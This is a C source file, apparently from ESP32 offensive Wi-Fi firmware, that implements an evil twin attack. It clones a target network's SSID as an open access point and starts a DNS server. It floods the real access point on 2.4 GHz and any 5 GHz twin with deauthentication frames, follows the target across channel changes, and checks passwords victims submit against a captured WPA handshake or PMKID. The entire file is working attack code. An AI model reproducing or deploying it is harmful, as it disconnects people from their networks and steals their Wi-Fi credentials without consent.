#include <string.h>
#include <esp_log.h>
#include <esp_timer.h>
#include "wifiMng.h"
#include "evil_twin.h"
#include "aircrack.h"
#include "sniffer.h"
#include "dns.h"
#include "wifi_attacks.h"
#include "server_api.h"


#define EVIL_TWIN_TASK_PRIO 5
#define CHANNEL_SWITCH_DELAY 15   // Channel switch assestment time
#define ATTACK_WINDOW        75  // RCO duration
#define SOFTAP_REST_TIME     300   // Home channel time

/* Store target information */
static const char *TAG = "EVIL_TWIN";
static TaskHandle_t evil_twin_task_handle = NULL;

/* Evil Twin Attack Status Strings */
static const char* evil_twin_attack_status_string[EVIL_TWIN_ATTACK_STATUS_MAX] = {
    "EVIL_TWIN_ATTACK_STATUS_IDLE",
    "EVIL_TWIN_ATTACK_STATUS_ACTIVE"
};

/* Evil Twin Status Information */
static evil_twin_attack_status_info_t evil_twin_status = { 0 };


static void evil_twin_task(void *pvParameters) 
{
    vTaskDelay(pdMS_TO_TICKS(1000));

    /* Get target information */
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
    target_info_t twin_on_5ghz = {0};

    /*Try guess by ssid */
    target->vendor = getVendor((char *)&target->ssid);

    /* Clone Access Point */
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = { 0 },
            .ssid_len = 0,
            .channel = target->channel,
            .password = "",
            .max_connection = 8,
            .authmode = WIFI_AUTH_OPEN,
            .pmf_cfg = {
                    /* Cannot set pmf to required when in wpa-wpa2 mixed mode! Setting pmf to optional mode. */
                    .required = false, 
                    .capable = true
            }
        },
    };
    strcpy((char *)&wifi_config.ap.ssid, (char *)&target->ssid);
    wifi_ap_clone(&wifi_config, NULL);
    /* Wait AP to be cloned */
    vTaskDelay(pdMS_TO_TICKS(2000));
    /* Start sniffer and beacon tracking */
    wifi_start_sniffing(target, SNIFF_MODE_ATTACK_EVIL_TWIN);

    /* NOTE: wifi_sniffer_scan_fill_aps utilize a mutex initialized with wifi_start_sniffing*/
    /* Try to find 5ghz twin AP */
    if(wifi_sniffer_scan_fill_aps() == ESP_OK) {
        aps_info_t *aps = malloc(sizeof(aps_info_t));
        if(aps) {
            if(wifi_sniffer_get_aps(aps) == ESP_OK) {
                /* Search in scanned aps */
                for(uint8_t i = 0; i < aps->count; i++) {
                    /* Found same AP on 5ghz */
                    if( (aps->ap[i].primary > 14) && (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0) ) {
                        twin_on_5ghz.attack_scheme = target->attack_scheme;
                        twin_on_5ghz.authmode = aps->ap[i].authmode;
                        twin_on_5ghz.channel = aps->ap[i].primary;
                        twin_on_5ghz.group_cipher = aps->ap[i].group_cipher;
                        twin_on_5ghz.pairwise_cipher = aps->ap[i].pairwise_cipher;
                        twin_on_5ghz.rssi = aps->ap[i].rssi;
                        twin_on_5ghz.vendor = target->vendor;
                        memcpy(twin_on_5ghz.ssid, aps->ap[i].ssid, sizeof(aps->ap[i].ssid));
                        memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, sizeof(aps->ap[i].bssid));
                        target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
                        evil_twin_status.has_5ghz_target = true;
                        ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
                        ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
                        break;
                    }
                }
            }
            free(aps);
        }
    }

    /* Periodic scan for target tracking */
    int64_t last_scan_time = esp_timer_get_time();
    const int64_t SCAN_INTERVAL_US = 30000000; // 30 seconds
    
    esp_err_t frame_send_err = ESP_OK;

    while(true)
    {
        for(uint8_t burst = 0; burst < 4; burst++) {
            frame_send_err = wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
            if(frame_send_err == ESP_OK) {
                evil_twin_status.packet_sent_2ghz++;
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }
        for(uint8_t burst = 0; burst < 4; burst++) {
            frame_send_err = wifi_attack_deauth_basic(NULL, target->bssid, 7);
            if(frame_send_err == ESP_OK) {
                evil_twin_status.packet_sent_2ghz++;
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }

        /* Deauth 5Ghz twin */
        if(evil_twin_status.has_5ghz_target == true ) {
            if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
                vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                /* Send Burst */
                for(uint8_t burst = 0; burst < 4; burst++) {
                    frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)twin_on_5ghz.ssid);
                    if(frame_send_err == ESP_OK) {
                        evil_twin_status.packet_sent_5ghz++;
                        vTaskDelay(pdMS_TO_TICKS(5));
                    }
                }
                for(uint8_t burst = 0; burst < 4; burst++) {
                    frame_send_err = wifi_attack_deauth_basic(NULL, twin_on_5ghz.bssid, 7);
                    if(frame_send_err == ESP_OK) {
                        evil_twin_status.packet_sent_5ghz++;
                        vTaskDelay(pdMS_TO_TICKS(5));
                    }
                }
            }
        }

        /* Periodic scan for target tracking */
        if (esp_timer_get_time() - last_scan_time > SCAN_INTERVAL_US) 
        {
            if(wifi_sniffer_scan_fill_aps() == ESP_OK) {
                aps_info_t *aps = malloc(sizeof(aps_info_t));
                if(aps) {
                    if(wifi_sniffer_get_aps(aps) == ESP_OK) {
                        bool found_2g_now = false;

                        for(uint8_t i = 0; i < aps->count; i++) {
                            if (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0) 
                            {
                                if (aps->ap[i].primary <= 14) {
                                    found_2g_now = true;
                                    if (target->channel != aps->ap[i].primary) {
                                        ESP_LOGW(TAG, "TARGET 2.4GHz SWITCHED CHANNEL: %d -> %d", target->channel, aps->ap[i].primary);
                                        ws_log(TAG, "Target 2.4GHz moved to Ch %d", aps->ap[i].primary);
                                        target->channel = aps->ap[i].primary;
                                        memcpy(target->bssid, aps->ap[i].bssid, 6);
                                        /* This will cause current STA to disconnect */
                                        wifi_set_channel_safe(target->channel);
                                    }
                                }
                                else {
                                    if (!evil_twin_status.has_5ghz_target) {
                                        evil_twin_status.has_5ghz_target = true;
                                        ESP_LOGI(TAG, "New 5GHz target found on Ch %d", aps->ap[i].primary);
                                    }
                                    if (twin_on_5ghz.channel != aps->ap[i].primary) {
                                        ESP_LOGW(TAG, "TARGET 5GHz SWITCHED CHANNEL: %d -> %d", twin_on_5ghz.channel, aps->ap[i].primary);
                                        ws_log(TAG, "Target 5GHz moved to Ch %d", aps->ap[i].primary);
                                        twin_on_5ghz.channel = aps->ap[i].primary;
                                        memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, 6);
                                    }
                                }
                            }
                        }
                        if(!found_2g_now) ESP_LOGW(TAG, "Lost track of 2.4GHz target in this scan.");
                    }
                    free(aps);
                }
            }
            last_scan_time = esp_timer_get_time();
        }
        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME)); 
    }
}


void evil_twin_start_attack(const target_info_t *targe_info)
{
    if( evil_twin_task_handle != NULL )
    {   
        ESP_LOGE(TAG, "EvilTwin task already started.");
        return;
    }

    /* Reset status information */
    memset(&evil_twin_status, 0, sizeof(evil_twin_attack_status_t));

    /* Start DNS Server */
    dns_server_start();
    
    target_set(targe_info, TARGET_INFO_EVIL_TWIN);
    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);

    evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_ACTIVE;
    ESP_LOGI(TAG, "Evil-Twin attack started.");
    ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target_get(TARGET_INFO_EVIL_TWIN)->ssid, target_get(TARGET_INFO_EVIL_TWIN)->channel);
}


void evil_twin_stop_attack(void)
{
    if (evil_twin_task_handle == NULL)
    {
        ESP_LOGE(TAG, "EvilTwin task is not running.");
        return;
    }

    /* Stop DNS Server */
    dns_server_stop();
    /* Kill task */
    vTaskDelete(evil_twin_task_handle);
    evil_twin_task_handle = NULL;
    /* Stop sniffer and beacon tracking */
    wifi_stop_beacon_tracking();
    wifi_stop_sniffing();
    /* Wait engine stop */
    vTaskDelay(pdMS_TO_TICKS(1000));
    /* Restore original hotspot */
    wifi_start_softap();

    evil_twin_status.current_status = EVIL_TWIN_ATTACK_STATUS_IDLE;
    ESP_LOGI(TAG, "Evil-Twin attack stopped.");
}


bool evil_twin_check_password(char *password)
{
    const handshake_info_t *handshake = wifi_sniffer_get_handshake();
    const target_info_t target = *target_get(TARGET_INFO_EVIL_TWIN);

    if( handshake->handshake_captured)
    {
        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic, handshake->key_decriptor_version);
    }
    if( handshake->pmkid_captured)
    {
        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
    }
    
    return false;
}


evil_twin_attack_status_t evil_twin_attack_get_status(void) 
{
    return evil_twin_status.current_status;
}


const char* evil_twin_attack_get_status_string(void)
{
    if(evil_twin_status.current_status >= EVIL_TWIN_ATTACK_STATUS_MAX || evil_twin_status.current_status < 0) {
        return "ERROR";
    }
    return evil_twin_attack_status_string[evil_twin_status.current_status];
}


const evil_twin_attack_status_info_t* evil_twin_attack_get_status_info(void) {
    return &evil_twin_status;
}